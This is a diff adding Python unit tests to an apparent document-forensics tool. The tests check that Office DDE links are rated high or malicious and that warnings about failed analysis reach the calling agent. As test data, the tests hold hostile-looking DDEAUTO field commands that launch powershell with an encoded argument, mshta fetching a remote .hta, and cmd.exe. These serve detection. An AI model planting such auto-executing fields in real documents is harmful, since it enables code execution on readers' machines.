@@ -200,6 +200,26 @@ class TestDdeChangesTheVerdict:
         links = [{"field_type": "DDE", "command": "DDE cmd.exe", "risk": "high"}]
         assert _assess_office_risk([], False, links)["risk_level"] == "high"
 
+    def test_an_auto_link_to_a_benign_target_is_high_not_malicious(self) -> None:
+        """A DDEAUTO to another spreadsheet is legitimate, if rare.
+
+        "malicious" is reserved for the same combination the VBA path reserves
+        it for: an automatic trigger meeting an executor.
+        """
+        links = [
+            {"field_type": "DDEAUTO", "command": 'DDEAUTO Excel "C:\\book.xlsx"'},
+        ]
+        assert _assess_office_risk([], False, links)["risk_level"] == "high"
+
+    def test_an_auto_link_to_an_interpreter_is_malicious(self) -> None:
+        for command in (
+            "DDEAUTO powershell -enc AAA",
+            "DDEAUTO mshta http://x/a.hta",
+            "DDEAUTO c:\\windows\\system32\\cmd.exe /k calc",
+        ):
+            links = [{"field_type": "DDEAUTO", "command": command}]
+            assert _assess_office_risk([], False, links)["risk_level"] == "malicious", command
+
     def test_the_reason_names_the_finding(self) -> None:
         links = _parse_msodde_output(MSODDE_DDEAUTO_JSON)
         risk = _assess_office_risk([], False, links)
@@ -281,3 +301,80 @@ class TestTheDdeCommandReachesTheIndex:
         assert indexed
         assert "cmd.exe" in indexed[0]
         assert "DDEAUTO" in indexed[0]
+
+
+class TestTheWarningSurvivesTheResponseEnvelope:
+    """Setting a key on the results dict is not enough to reach the agent.
+
+    ``tool_response`` with a *source* returns a compact envelope --
+    ``tool_call_id``, ``status``, ``source``, a 500-char ``preview`` and a
+    ``hint`` -- and drops every other key. A degraded-run marker placed in the
+    results therefore never reached the caller: the agent read a preview with
+    no findings and concluded the evidence was clean, which is the failure this
+    PR exists to prevent.
+
+    These tests call the real ``tool_response``, not a capturing stand-in.
+    """
+
+    def test_a_warning_is_forwarded(self) -> None:
+        from mulder.server.helpers import tool_response
+
+        resp = tool_response(
+            "tc_1",
+            "run_thing",
+            {},
+            {"findings": [], "warning": "msodde exited 1; DDE analysis did not run"},
+            "some.source",
+        )
+        assert "did not run" in str(resp["warning"])
+
+    def test_a_partial_marker_is_forwarded(self) -> None:
+        from mulder.server.helpers import tool_response
+
+        resp = tool_response(
+            "tc_1", "run_thing", {}, {"partial": True, "features_indexed": 2}, "bulk"
+        )
+        assert resp["partial"] is True
+
+    def test_a_clean_run_carries_neither(self) -> None:
+        from mulder.server.helpers import tool_response
+
+        resp = tool_response("tc_1", "run_thing", {}, {"findings": []}, "some.source")
+        assert "warning" not in resp
+        assert "partial" not in resp
+
+    def test_the_envelope_is_still_compact(self) -> None:
+        """The forwarding must not smuggle the whole result back in."""
+        from mulder.server.helpers import tool_response
+
+        resp = tool_response(
+            "tc_1",
+            "run_thing",
+            {},
+            {"findings": [{"x": 1}], "warning": "w"},
+            "some.source",
+        )
+        assert "findings" not in resp
+
+    def test_a_failed_dde_run_reaches_the_agent(self, tmp_path: Path) -> None:
+        """End to end, through the real envelope."""
+        from mulder.server.helpers import tool_response
+
+        target = tmp_path / "doc.docx"
+        target.write_bytes(b"PK\x03\x04")
+
+        def fake_run(cmd: list[str], **kwargs: object) -> subprocess.CompletedProcess[str]:
+            if "oletools.msodde" in cmd:
+                return _completed(returncode=1, stderr="msodde: cannot open file")
+            return _completed(stdout=OLEVBA_CLEAN_JSON)
+
+        with (
+            patch("mulder.server.tools.documents.subprocess.run", side_effect=fake_run),
+            patch.object(doc, "extract_and_index", return_value={}),
+            patch.object(doc, "tool_response", tool_response),
+        ):
+            resp = doc.analyze_office_document.__wrapped__(  # type: ignore[attr-defined]
+                "case-1", str(target), analyze_dde=True
+            )
+
+        assert "did not run" in str(resp["warning"])
